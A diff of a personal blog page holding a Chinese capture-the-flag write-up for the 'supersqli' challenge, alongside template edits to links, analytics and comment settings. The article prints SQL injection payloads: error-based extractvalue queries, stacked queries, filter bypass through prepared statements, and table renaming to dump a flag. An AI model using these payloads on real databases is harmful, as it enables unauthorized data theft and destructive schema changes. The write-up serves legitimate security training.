@@ -20,10 +20,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>攻防世界-supersqli | hybcx&#39;s blog</title>
@@ -269,7 +279,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -326,7 +336,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -421,11 +431,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -444,28 +449,28 @@
 <h2 id="题目解题：">题目解题：</h2>
 <p>根据题目很显然是sql注入了</p>
 <p>我们打开题目看看</p>
-<p><img src="/2023/08/14/supersqli/image-20230814161303863.png" alt="image-20230814161303863"></p>
-<p><img src="/2023/08/14/supersqli/image-20230814161319209.png" alt="image-20230814161319209"></p>
+<p><img src="image-20230814161303863.png" alt="image-20230814161303863"></p>
+<p><img src="image-20230814161319209.png" alt="image-20230814161319209"></p>
 <p>正常输入1，也正常回显，随之输入1’发现报错，证实存在sql注入，且为单引号闭合</p>
-<p><img src="/2023/08/14/supersqli/image-20230814161351875.png" alt="image-20230814161351875"></p>
+<p><img src="image-20230814161351875.png" alt="image-20230814161351875"></p>
 <p>这里接着测试几波，发现#可以成功注释内容，接着先判断列数，根据报错情况，发现为2列</p>
 <p>接着联合注入一下</p>
 <pre class="line-numbers language-none"><code class="language-none">1' union select 1, database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814161645188.png" alt="image-20230814161645188"></p>
+<p><img src="image-20230814161645188.png" alt="image-20230814161645188"></p>
 <p>发现被正则过滤了，并且大小写，双写绕过也不行，update也过滤了，那我们尝试一下extract报错注入</p>
 <pre class="line-numbers language-none"><code class="language-none">1' and extractvalue(1,concat(0x7e,database())) #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814162450682.png" alt="image-20230814162450682"></p>
+<p><img src="image-20230814162450682.png" alt="image-20230814162450682"></p>
 <p>成功执行！</p>
 <p>继续干</p>
 <pre class="line-numbers language-none"><code class="language-none">1' and extractvalue(1,concat(0x7e,database())) #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>但又想到，关键词依旧是被过滤的，还是行不通，没思路了，看了wp发现，居然忘了堆叠注入，那就熟悉一下</p>
 <pre class="line-numbers language-none"><code class="language-none">1'; show databases; # <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814162824221.png" alt="image-20230814162824221"></p>
+<p><img src="image-20230814162824221.png" alt="image-20230814162824221"></p>
 <pre class="line-numbers language-none"><code class="language-none">1'; use supersqli;show tables; # <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814162910454.png" alt="image-20230814162910454"></p>
+<p><img src="image-20230814162910454.png" alt="image-20230814162910454"></p>
 <pre class="line-numbers language-none"><code class="language-none">1';use supersqli;show columns from `1919810931114514`;#  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里注意：纯数字为表名，要用反引号包裹</p>
-<p><img src="/2023/08/14/supersqli/image-20230814163006610.png" alt="image-20230814163006610"></p>
+<p><img src="image-20230814163006610.png" alt="image-20230814163006610"></p>
 <p>找到flag，到这一步就头疼了，本来要select的，不过被过滤了，思路没了，继续看wp，方法真多啊</p>
 <h3 id="方法一：sql预编译">方法一：sql预编译</h3>
 <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bb15070047748/article/details/107266400?ops_request_misc=%7B%22request%5Fid%22%3A%22165340935616781818716838%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=165340935616781818716838&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-107266400-null-null.142%5Ev10%5Econtrol,157%5Ev12%5Econtrol&amp;utm_term=mysql%E9%A2%84%E7%BC%96%E8%AF%91&amp;spm=1018.2226.3001.4187">预编译</a></p>
@@ -477,15 +482,15 @@
 <span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>合起来为</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">';set @sql = CONCAT('</span>se<span class="token string">','</span>lect <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814163452920.png" alt="image-20230814163452920"></p>
+<p><img src="image-20230814163452920.png" alt="image-20230814163452920"></p>
 <p>。。。set也过滤了，不过幸好可以大小写绕过</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">';Set @sql = CONCAT('</span>se<span class="token string">','</span>lect <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814163620789.png" alt="image-20230814163620789"></p>
+<p><img src="image-20230814163620789.png" alt="image-20230814163620789"></p>
 <p>拿到flag，这里也是因为这道题开启了sql预编译，不然这方法行不通</p>
 <h3 id="方法二：改列名">方法二：改列名</h3>
 <p>我们查询words列发现结构大致相同，由于注入框的查询是对列<code>id</code>的搜索，此时参考两个表的列名，需要将<code>flag</code>列名改为能够查找的<code>id</code>列（修改包括名称和数据类型）。</p>
 <pre class="line-numbers language-none"><code class="language-none">1';use supersqli;show columns from words;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/14/supersqli/image-20230814163904529.png" alt="image-20230814163904529"></p>
+<p><img src="image-20230814163904529.png" alt="image-20230814163904529"></p>
 <p>接下来输入：</p>
 <pre class="line-numbers language-none"><code class="language-none">1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>GPT分析一波上述sql语句</p>
@@ -505,7 +510,7 @@
 
 总之，这个SQL语句的目的似乎是通过重命名表和修改字段来对数据库进行恶意操作。这种类型的攻击可能会导致数据损坏、数据泄露以及系统崩溃等问题。在开发和维护应用程序时，务必采取必要的安全措施，如使用参数化查询、输入验证和避免动态构建SQL语句，以防范SQL注入等安全风险。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>那这里我们直接万能语句1’ or 1=1#就可以了，毕竟flag现在在id字段里，但这里似乎flag的id字段默认为0了，以至于我们可以查出来，但GPT说这里默认应为null。不过使用万能语句，即可查询到sql中所有字段数对应的数据</p>
-<p><img src="/2023/08/14/supersqli/image-20230814164731809.png" alt="image-20230814164731809"></p>
+<p><img src="image-20230814164731809.png" alt="image-20230814164731809"></p>
 <h3 id="方法三：改列名-另类方法">方法三：改列名-另类方法</h3>
 <p>第二个方法是将两个表列名互换，查询语句不变的情况下，会直接查询words表中内容。</p>
 <pre><code>RENAME TABLE tbl_name TO new_tbl_name 将表tbl_name的名字改成new_tbl_name。
@@ -519,7 +524,7 @@
 <pre><code>1';RENAME TABLE `words` TO `word`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words;
 </code></pre>
 <p>到这里我们的表列名就已经修改完毕，此时还会输出修改完成的words列名，最后通过万能钥匙1’ or ‘1’='1即可得到输出。</p>
-<p><img src="/2023/08/14/supersqli/image-20230814165507750.png" alt="image-20230814165507750"></p>
+<p><img src="image-20230814165507750.png" alt="image-20230814165507750"></p>
 <h2 id="参考文章：">参考文章：</h2>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53105813/article/details/124957962?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169200154316800180684336%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169200154316800180684336&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-124957962-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supersqli&amp;spm=1018.2226.3001.4187">参考一</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62281892/article/details/126922482?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169200154316800180684336%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169200154316800180684336&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-126922482-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supersqli&amp;spm=1018.2226.3001.4187">参考二</a></p>
@@ -613,7 +618,7 @@
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -621,7 +626,7 @@
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -901,12 +906,12 @@
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1035,6 +1040,8 @@
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1062,8 +1069,8 @@
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1146,8 +1153,6 @@
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1167,24 +1172,28 @@
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1396,8 +1405,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
